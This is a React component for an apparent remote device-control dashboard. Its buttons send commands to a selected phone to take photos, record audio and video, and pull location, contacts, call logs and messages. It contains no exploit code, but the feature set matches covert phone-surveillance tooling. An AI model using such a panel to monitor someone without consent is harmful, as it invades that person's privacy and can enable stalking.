import { useState } from 'react';
import {
  Camera,
  Mic,
  Video,
  Map,
  Users,
  Phone,
  MessageSquare,
  Info,
  Settings,
} from 'lucide-react';
import { LucideIcon } from 'lucide-react';
import RemoteControlConfigModal, { RemoteControlConfig } from './RemoteControlConfigModal';

interface CommandButton {
  action: string;
  label: string;
  icon: LucideIcon;
  iconColor: string;
  requiresConfig?: boolean;
}

interface CommandButtonsProps {
  onCommandClick: (action: string, config?: RemoteControlConfig) => void;
  disabled?: boolean;
}

const commandButtons: CommandButton[] = [
  { action: 'take_photo', label: 'Take Photo', icon: Camera, iconColor: 'text-blue-500', requiresConfig: true },
  { action: 'record_audio', label: 'Record Audio', icon: Mic, iconColor: 'text-green-500', requiresConfig: true },
  { action: 'record_video', label: 'Record Video', icon: Video, iconColor: 'text-purple-500', requiresConfig: true },
  { action: 'get_location', label: 'Get Location', icon: Map, iconColor: 'text-orange-500' },
  { action: 'get_contacts', label: 'Get Contacts', icon: Users, iconColor: 'text-indigo-500' },
  { action: 'get_call_logs', label: 'Get Call Logs', icon: Phone, iconColor: 'text-pink-500' },
  { action: 'get_messages', label: 'Get Messages', icon: MessageSquare, iconColor: 'text-teal-500' },
  { action: 'get_telemetry_info', label: 'Get Device Info', icon: Info, iconColor: 'text-cyan-500' },
  // { action: 'show_setup_screen', label: 'Show Setup Screen', icon: Settings, iconColor: 'text-amber-500' }
];

export default function CommandButtons({ onCommandClick, disabled = false }: CommandButtonsProps) {
  const [isConfigModalOpen, setIsConfigModalOpen] = useState(false);
  const [pendingAction, setPendingAction] = useState<string>('');

  const handleCommandClick = (action: string, requiresConfig?: boolean) => {
    if (requiresConfig) {
      setPendingAction(action);
      setIsConfigModalOpen(true);
    } else {
      onCommandClick(action);
    }
  };

  const handleConfigConfirm = (config: RemoteControlConfig) => {
    onCommandClick(pendingAction, config);
    setPendingAction('');
  };

  const handleConfigModalClose = () => {
    setIsConfigModalOpen(false);
    setPendingAction('');
  };

  return (
    <>
      <div className="bg-white dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700">
        <div className="px-6 py-4 border-b border-gray-200 dark:border-gray-700">
          <h2 className="text-lg font-semibold text-gray-900 dark:text-gray-100">Remote Commands</h2>
          <p className="text-sm text-gray-600 dark:text-gray-400">Send commands to the selected device</p>
        </div>

        <div className="p-6">
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-10 gap-4">
            {commandButtons.map(({ action, icon: Icon, label, iconColor, requiresConfig }) => (
              <button
                key={action}
                onClick={() => handleCommandClick(action, requiresConfig)}
                disabled={disabled}
                className={`flex flex-col items-center gap-3 p-3 rounded-lg bg-white dark:bg-gray-700 border border-gray-200 dark:border-gray-600 hover:border-gray-300 dark:hover:border-gray-500 hover:shadow-md transition-all ${disabled ? 'opacity-50 cursor-not-allowed' : 'cursor-pointer'
                  }`}
              >
                <Icon className={`h-5 w-5 ${iconColor}`} />
                <small className="text-sm text-gray-700 dark:text-gray-300">{label}</small>
              </button>
            ))}
          </div>
        </div>
      </div>

      <RemoteControlConfigModal
        isOpen={isConfigModalOpen}
        onClose={handleConfigModalClose}
        onConfirm={handleConfigConfirm}
        action={pendingAction}
        actionLabel={commandButtons.find(btn => btn.action === pendingAction)?.label || ''}
      />
    </>
  );
}

